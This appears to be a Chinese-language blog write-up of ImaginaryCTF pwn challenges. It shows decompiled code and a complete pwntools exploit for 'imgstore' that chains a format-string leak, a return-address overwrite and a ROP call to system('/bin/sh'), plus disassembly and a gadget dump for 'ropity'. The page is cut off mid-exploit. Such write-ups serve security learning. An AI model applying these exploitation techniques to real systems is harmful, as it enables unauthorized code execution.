<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>ImaginaryCTF | nyyyddddn</title>
  <meta name="author" content="nyyyddddn">
  
  <meta name="description" content="pwnimgstoreunsigned __int64 sell_book()
&amp;#123;
  char v1; // [rsp+7h] [rbp-59h] BYREF
  int buf; // [rsp+8h] [rbp-58h] BYREF
  int fd; // [rsp+Ch] [rbp-54h]
  char s[72]; // [rsp+10h] [rbp-50h] BYREF
  unsigned __int64 v5; // [rsp+58h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  fd = open(&#34;/dev/urandom&#34;, 0);
  read(fd, &amp;amp;buf, 4uLL);
  close(fd);
  buf = (unsigned __int16)buf;
  do
  &amp;#123;
    printf(&#34;Enter book title: &#34;);
    fgets(s, 50, stdin);
    printf(&#34;Book title --&gt; &#34;);
    printf(s);
    puts(&amp;amp;::s);
    if ( 334873123 * buf == dword_6050 )
    &amp;#123;
      dword_608C = 2;
      sub_1D77(2);
    &amp;#125;
    puts(&#34;Sorry, we already have the same title as yours in our database; give me another book title.&#34;);
    printf(&#34;Still interested in selling your book? [y/n]: &#34;);
    __isoc99_scanf(&#34;%1c&#34;, &amp;amp;v1);
    getchar();
  &amp;#125;
  while ( v1 == &#39;y&#39; );
  puts(&amp;amp;::s);
  printf(&#34;%s[-] Exiting program..%s\n&#34;, &#34;\x1B[31m&#34;, &#34;\x1B[0m&#34;);
  sleep(1u);
  return __readfsqword(0x28u) ^ v5;
&amp;#125;

unsigned __int64 __fastcall sub_1D77(int a1)
&amp;#123;
  char s[104]; // [rsp+10h] [rbp-70h] BYREF
  unsigned __int64 v3; // [rsp+78h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  sub_18F2();
  if ( a1 == 2 )
  &amp;#123;
    printf(&#34;%s[/] UNDER DEVELOPMENT %s\n&#34;, &#34;\x1B[44m&#34;, &#34;\x1B[0m&#34;);
    putchar(62);
    fgets(s, 160, stdin);
  &amp;#125;
  else
  &amp;#123;
    printf(&#34;%s[!] SECURITY BREACH DETECTED%s\n&#34;, &#34;\x1B[41m&#34;, &#34;\x1B[0m&#34;);
    puts(&#34;[+] BAD HACKER!!&#34;);
  &amp;#125;
  return __readfsqword(0x28u) ^ v3;
&amp;#125;

程序中存在格式化字符串漏洞，和一个栈溢出漏洞，泄露地址后 直接改printf函数的返回地址然后打 rop就好了，就不需要任意地址写两次满足上面的约束，任意地址写的话，直接清空两个位置好像也行，&amp;#x2F;dev&amp;#x2F;urandom是真随机数，直接清空的话甚至不需要泄露
exp
from pwn import *
# from LibcSearcher import *
import itertools
import ctypes

context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;)

is_debug = 1
IP = &#34;47.100.139.115&#34;
PORT = 30708

elf = context.binary = ELF(&#39;./imgstore&#39;)
# libc = elf.libc
libc = ELF(&#39;./libc.so.6&#39;)

def connect():
    return remote(IP, PORT) if not is_debug else process()

g = lambda x: gdb.attach(x)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
r = lambda x=None: p.recv() if x is None else p.recv(x)
rl = lambda: p.recvline()
ru = lambda x: p.recvuntil(x)
r_leak_libc_64 = lambda: u64(p.recvuntil(b&#39;\x7f&#39;)[-6:].ljust(8, b&#39;\x00&#39;))
r_leak_libc_32 = lambda: u32(p.recvuntil(b&#39;\xf7&#39;)[-4:])

p = connect()


sla(&#34;&gt;&gt;&#34;,&#34;3&#34;)

# elf - canary - stack
payload = b&#34;-%14$p-%17$p-%18$p&#34;
sla(&#34;title:&#34;,payload)

ru(&#34;Book title --&gt; &#34;)
ru(&#39;-&#39;)
elf_base = int(r(14),16) - (0x63cbb30f52b0 - 0x63cbb30f3000)
ru(&#39;-&#39;)
canary = int(r(18),16)
ru(&#39;-&#39;)
printf_addr = int(r(14),16) - (0x7ffdec097dc0 - 0x7ffdec097d38)
sla(&#34;Still interested in selling your book? [y/n]&#34;,&#34;y&#34;)


payload = b&#34;-%10$s&#34;
payload = payload.ljust(0x10,b&#39;\x00&#39;)
payload += p64(elf_base + elf.got[&#39;puts&#39;])
sla(&#34;title:&#34;,payload)

ru(&#34;Book title --&gt; &#34;)
ru(&#39;-&#39;)
libc_base = u64(r(6).ljust(8,b&#39;\x00&#39;)) - libc.sym[&#39;puts&#39;]
sla(&#34;Still interested in selling your book? [y/n]&#34;,&#34;y&#34;)

payload = b&#34;%&#34; + str(0xf1).encode() + b&#34;c%10$hhn&#34;
payload = payload.ljust(0x10,b&#39;a&#39;)
payload += p64(printf_addr)
sla(&#34;title:&#34;,payload)

time.sleep(0.3)

rdi = elf_base + 0x0000000000002313
ret = elf_base + 0x000000000000101a
system = libc_base + libc.sym[&#39;system&#39;]
binsh = libc_base + next(libc.search(b&#39;/bin/sh&#39;))


payload = b&#39;a&#39; * 0x68 + p64(canary) + b&#39;a&#39; * 0x8
payload += p64(ret) + p64(rdi) + p64(binsh) + p64(system)
sl(payload)




p.interactive()

ropity.text:0000000000401136                               ; int __cdecl main(int argc, const char **argv, const char **envp)
.text:0000000000401136                               public main
.text:0000000000401136                               main proc near                          ; DATA XREF: _start+18↑o
.text:0000000000401136
.text:0000000000401136                               s= byte ptr -8
.text:0000000000401136
.text:0000000000401136                               ; __unwind &amp;#123;
.text:0000000000401136 F3 0F 1E FA                   endbr64
.text:000000000040113A 55                            push    rbp
.text:000000000040113B 48 89 E5                      mov     rbp, rsp
.text:000000000040113E 48 83 EC 10                   sub     rsp, 10h
.text:0000000000401142 48 8B 15 E7 2E 00 00          mov     rdx, cs:__bss_start             ; stream
.text:0000000000401149 48 8D 45 F8                   lea     rax, [rbp+s]
.text:000000000040114D BE 00 01 00 00                mov     esi, 100h                       ; n
.text:0000000000401152 48 89 C7                      mov     rdi, rax                        ; s
.text:0000000000401155 E8 E6 FE FF FF                call    _fgets
.text:0000000000401155
.text:000000000040115A 90                            nop
.text:000000000040115B C9                            leave
.text:000000000040115C C3                            retn
.text:000000000040115C                               ; &amp;#125; // starts at 401136
.text:000000000040115C
.text:000000000040115C                               main endp
.text:000000000040115C
.text:000000000040115D
.text:000000000040115D                               ; =============== S U B R O U T I N E =======================================
.text:000000000040115D
.text:000000000040115D                               ; Attributes: bp-based frame
.text:000000000040115D
.text:000000000040115D                               ; signed __int64 __fastcall printfile(const char *, __int64, int)
.text:000000000040115D                               public printfile
.text:000000000040115D                               printfile proc near
.text:000000000040115D
.text:000000000040115D                               var_8= qword ptr -8
.text:000000000040115D
.text:000000000040115D                               ; __unwind &amp;#123;
.text:000000000040115D F3 0F 1E FA                   endbr64
.text:0000000000401161 55                            push    rbp
.text:0000000000401162 48 89 E5                      mov     rbp, rsp
.text:0000000000401165 48 89 7D F8                   mov     [rbp+var_8], rdi
.text:0000000000401169 48 C7 C0 02 00 00 00          mov     rax, 2
.text:0000000000401170 48 C7 C6 00 00 00 00          mov     rsi, 0                          ; flags
.text:0000000000401177 0F 05                         syscall                                 ; LINUX - sys_open
.text:0000000000401179 48 89 C6                      mov     rsi, rax                        ; in_fd
.text:000000000040117C 48 C7 C7 01 00 00 00          mov     rdi, 1                          ; out_fd
.text:0000000000401183 48 C7 C2 00 00 00 00          mov     rdx, 0                          ; offset
.text:000000000040118A 49 C7 C0 00 01 00 00          mov     r8, 100h
.text:0000000000401191 48 C7 C0 28 00 00 00          mov     rax, 28h ; &#39;(&#39;
.text:0000000000401198 0F 05                         syscall                                 ; LINUX - sys_sendfile
.text:000000000040119A 90                            nop
.text:000000000040119B 5D                            pop     rbp
.text:000000000040119C C3                            retn
.text:000000000040119C                               ; &amp;#125; // starts at 40115D
.text:000000000040119C
.text:000000000040119C                               printfile endp
.text:000000000040119C

真的是很巧妙的构造，main函数中存在一个栈溢出，是fgets函数，然后有一个printfile函数，通过open 和 sendfile将一个文件的内容打印出来，printfile在使用前必须控制rdi寄存器才能printfile成功，由于高版本glibc csu函数变成了动态链接，所以以ret结尾能控制寄存器的gadget寥寥无几，能控制rdi寄存器为我想要的值的gadget基本上没有
lhj@lhj-virtual-machine:~&amp;#x2F;Desktop&amp;#x2F;ImaginaryCTF&amp;#x2F;pwn&amp;#x2F;ropity$ ROPgadget --binary vuln
Gadgets information
&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;&amp;#x3D;
0x00000000004010ab : add bh, bh ; loopne 0x401115 ; nop ; ret
0x000000000040116f : add byte ptr [rax - 0x39], cl ; mov byte ptr [rax], 0 ; add byte ptr [rax], al ; syscall
0x0000000000401182 : add byte ptr [rax - 0x39], cl ; ret 0
0x0000000000401190 : add byte ptr [rax - 0x39], cl ; shr byte ptr [rax], 0 ; add byte ptr [rax], al ; syscall
0x0000000000401180 : add byte ptr [rax], al ; add byte ptr [rax - 0x39], cl ; ret 0
0x000000000040107c : add byte ptr [rax], al ; add byte ptr [rax], al ; endbr64 ; ret
0x0000000000401173 : add byte ptr [rax], al ; add byte ptr [rax], al ; syscall
0x0000000000401036 : add byte ptr [rax], al ; add dl, dh ; jmp 0x401020
0x000000000040111a : add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x000000000040107e : add byte ptr [rax], al ; endbr64 ; ret
0x000000000040118f : add byte ptr [rax], al ; mov rax, 0x28 ; syscall
0x000000000040116e : add byte ptr [rax], al ; mov rsi, 0 ; syscall
0x0000000000401175 : add byte ptr [rax], al ; syscall
0x000000000040100d : add byte ptr [rax], al ; test rax, rax ; je 0x401016 ; call rax
0x000000000040111b : add byte ptr [rcx], al ; pop rbp ; ret
0x00000000004010aa : add dil, dil ; loopne 0x401115 ; nop ; ret
0x0000000000401038 : add dl, dh ; jmp 0x401020
0x000000000040111c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401117 : add eax, 0x2f1b ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401017 : add esp, 8 ; ret
0x0000000000401016 : add rsp, 8 ; ret
0x0000000000401159 : call qword ptr [rax + 0xff3c3c9]
0x000000000040103e : call qword ptr [rax - 0x5e1f00d]
0x0000000000401014 : call rax
0x0000000000401133 : cli ; jmp 0x4010c0
0x0000000000401083 : cli ; ret
0x00000000004011a3 : cli ; sub rsp, 8 ; add rsp, 8 ; ret
0x0000000000401130 : endbr64 ; jmp 0x4010c0
0x0000000000401080 : endbr64 ; ret
0x0000000000401012 : je 0x401016 ; call rax
0x00000000004010a5 : je 0x4010b0 ; mov edi, 0x404030 ; jmp rax
0x00000000004010e7 : je 0x4010f0 ; mov edi, 0x404030 ; jmp rax
0x000000000040103a : jmp 0x401020
0x0000000000401134 : jmp 0x4010c0
0x000000000040100b : jmp 0x4840103f
0x00000000004010ac : jmp rax
0x000000000040115b : leave ; ret
0x00000000004010ad : loopne 0x401115 ; nop ; ret
0x0000000000401172 : mov byte ptr [rax], 0 ; add byte ptr [rax], al ; syscall
0x0000000000401116 : mov byte ptr [rip + 0x2f1b], 1 ; pop rbp ; ret
0x0000000000401192 : mov eax, 0x28 ; syscall
0x00000000004010a7 : mov edi, 0x404030 ; jmp rax
0x0000000000401171 : mov esi, 0 ; syscall
0x0000000000401191 : mov rax, 0x28 ; syscall
0x0000000000401170 : mov rsi, 0 ; syscall
0x000000000040115a : nop ; leave ; ret
0x000000000040119a : nop ; pop rbp ; ret
0x00000000004010af : nop ; ret
0x000000000040112c : nop dword ptr [rax] ; endbr64 ; jmp 0x4010c0
0x00000000004010a6 : or dword ptr [rdi + 0x404030], edi ; jmp rax
0x000000000040111d : pop rbp ; ret
0x000000000040101a : ret
0x0000000000401185 : ret 0
0x0000000000401011 : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
0x0000000000401118 : sbb ebp, dword ptr [rdi] ; add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401193 : shr byte ptr [rax], 0 ; add byte ptr [rax], al ; syscall
0x0000000000401194 : sub byte ptr [rax], al ; add byte ptr [rax], al ; syscall
0x00000000004011a5 : sub esp, 8 ; add rsp, 8 ; ret
0x00000000004011a4 : sub rsp, 8 ; add rsp, 8 ; ret
0x0000000000401177 : syscall
0x0000000000401010 : test eax, eax ; je 0x401016 ; call rax
0x00000000004010a3 : test eax, eax ; je 0x4010b0 ; mov edi, 0x404030 ; jmp rax
0x00000000004010e5 : test eax, eax ; je 0x4010f0 ; mov edi, 0x404030 ; jmp rax
0x000000000040100f : test rax, rax ; je 0x401016 ; call rax
0x00000000004010a8 : xor byte ptr [rax + 0x40], al ; add bh, bh ; loopne 0x401115 ; nop ; ret

Unique gadgets found: 65"> 
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="ImaginaryCTF"/>
  <meta property="og:site_name" content="nyyyddddn"/>

  
    <meta property="og:image" content=""/>
  

  
    <link rel="alternative" href="/atom.xml" title="nyyyddddn" type="application/atom+xml">
  
  
    <link href="/favicon.png" rel="icon">
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  




<meta name="generator" content="Hexo 6.3.0"></head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">nyyyddddn</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class=""></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/catergories" title="All the categories.">
			  <i class=""></i>Categories
			</a>
		  </li>
		  
		  <li>
			<a href="/tags" title="All the tags.">
			  <i class=""></i>Tags
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="About me.">
			  <i class=""></i>About
			</a>
		  </li>
		  
		  <li>
			<a href="/atom.xml" title="Subscribe me.">
			  <i class=""></i>RSS
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 


	
		<div class="page-header">
			<h1> ImaginaryCTF</h1>
		</div>
	



<div class="row post">
	<!-- cols -->
	
	<div id="top_meta"></div>
	<div class="col-md-9">
	

	<!-- content -->
	<div class="mypage">		
	  		

	  <h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="imgstore"><a href="#imgstore" class="headerlink" title="imgstore"></a>imgstore</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">sell_book</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> v1<span class="token punctuation">;</span> <span class="token comment">// [rsp+7h] [rbp-59h] BYREF</span>
  <span class="token keyword">int</span> buf<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-58h] BYREF</span>
  <span class="token keyword">int</span> fd<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-54h]</span>
  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">72</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-50h] BYREF</span>
  <span class="token keyword">unsigned</span> __int64 v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+58h] [rbp-8h]</span>

  v5 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/urandom"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">4uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>
  buf <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int16<span class="token punctuation">)</span>buf<span class="token punctuation">;</span>
  <span class="token keyword">do</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Enter book title: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fgets</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Book title --> "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token operator">::</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">334873123</span> <span class="token operator">*</span> buf <span class="token operator">==</span> dword_6050 <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      dword_608C <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
      <span class="token function">sub_1D77</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Sorry, we already have the same title as yours in our database; give me another book title."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Still interested in selling your book? [y/n]: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%1c"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span> v1 <span class="token operator">==</span> <span class="token char">'y'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token operator">::</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s[-] Exiting program..%s\n"</span><span class="token punctuation">,</span> <span class="token string">"\x1B[31m"</span><span class="token punctuation">,</span> <span class="token string">"\x1B[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v5<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">unsigned</span> __int64 __fastcall <span class="token function">sub_1D77</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">104</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-70h] BYREF</span>
  <span class="token keyword">unsigned</span> __int64 v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+78h] [rbp-8h]</span>

  v3 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">sub_18F2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> a1 <span class="token operator">==</span> <span class="token number">2</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s[/] UNDER DEVELOPMENT %s\n"</span><span class="token punctuation">,</span> <span class="token string">"\x1B[44m"</span><span class="token punctuation">,</span> <span class="token string">"\x1B[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token number">62</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fgets</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">160</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">else</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s[!] SECURITY BREACH DETECTED%s\n"</span><span class="token punctuation">,</span> <span class="token string">"\x1B[41m"</span><span class="token punctuation">,</span> <span class="token string">"\x1B[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] BAD HACKER!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v3<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>程序中存在格式化字符串漏洞，和一个栈溢出漏洞，泄露地址后 直接改printf函数的返回地址然后打 rop就好了，就不需要任意地址写两次满足上面的约束，任意地址写的话，直接清空两个位置好像也行，&#x2F;dev&#x2F;urandom是真随机数，直接清空的话甚至不需要泄露</p>
<p>exp</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment"># from LibcSearcher import *</span>
<span class="token keyword">import</span> itertools
<span class="token keyword">import</span> ctypes

context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>

is_debug <span class="token operator">=</span> <span class="token number">1</span>
IP <span class="token operator">=</span> <span class="token string">"47.100.139.115"</span>
PORT <span class="token operator">=</span> <span class="token number">30708</span>

elf <span class="token operator">=</span> context<span class="token punctuation">.</span>binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./imgstore'</span><span class="token punctuation">)</span>
<span class="token comment"># libc = elf.libc</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc.so.6'</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> remote<span class="token punctuation">(</span>IP<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token keyword">not</span> is_debug <span class="token keyword">else</span> process<span class="token punctuation">(</span><span class="token punctuation">)</span>

g <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
s <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
r <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> x <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">else</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
r_leak_libc_64 <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
r_leak_libc_32 <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

p <span class="token operator">=</span> connect<span class="token punctuation">(</span><span class="token punctuation">)</span>


sla<span class="token punctuation">(</span><span class="token string">">>"</span><span class="token punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">)</span>

<span class="token comment"># elf - canary - stack</span>
payload <span class="token operator">=</span> <span class="token string">b"-%14$p-%17$p-%18$p"</span>
sla<span class="token punctuation">(</span><span class="token string">"title:"</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>

ru<span class="token punctuation">(</span><span class="token string">"Book title --> "</span><span class="token punctuation">)</span>
ru<span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">)</span>
elf_base <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">0x63cbb30f52b0</span> <span class="token operator">-</span> <span class="token number">0x63cbb30f3000</span><span class="token punctuation">)</span>
ru<span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">)</span>
